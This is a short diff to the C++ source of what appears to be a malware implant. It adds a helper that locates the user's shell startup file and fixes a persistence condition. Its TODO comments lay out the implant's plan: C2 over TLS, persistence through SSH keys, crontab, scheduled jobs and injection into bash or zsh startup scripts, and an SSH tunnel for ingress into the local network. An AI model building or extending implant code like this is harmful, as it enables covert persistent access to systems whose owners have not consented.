@@ -14,6 +14,7 @@
 #include <vector>
 #include "ssh_persistence.h"
 #include "crontab_persistence.h"
+#include "get_shell_startup_script.h"
 
 Core::Core() {
     std::cout << "[+] Application core initialized" << '\n';
@@ -32,7 +33,7 @@ void Core::loop() {
     /* TODO
      * at this point, the implant has established C2 communication (over TLS), and the persistence routines have run;
      *
-     * 1. conditional: if established_persistence_count > 0: attempt to establish persistence via scheduled job and injecting startup scripts (bash, zsh, ash, etc.)
+     * 1. conditional: if established_persistence_count < 1: attempt to establish persistence via scheduled job and injecting startup scripts (bash, zsh, ash, etc.)
      *      - echo $SHELL or "ps -p $$ -o comm="
      *      - scheduled_job_persistence()
      *      - startup_script_persistence()
@@ -50,6 +51,8 @@ void Core::loop() {
      *              - open_ingress_tunnel       -> open an ssh-tunnel based ingress channel into the local network
      *      
     */
+    std::string shell_startup_file = get_shell_startup_script();
+    std::cout << shell_startup_file << '\n';
 }
                                             // The TLS encryption of this request has been confirmed with Wireshark
                                             // consult for further changes: https://github.com/yhirose/cpp-httplib
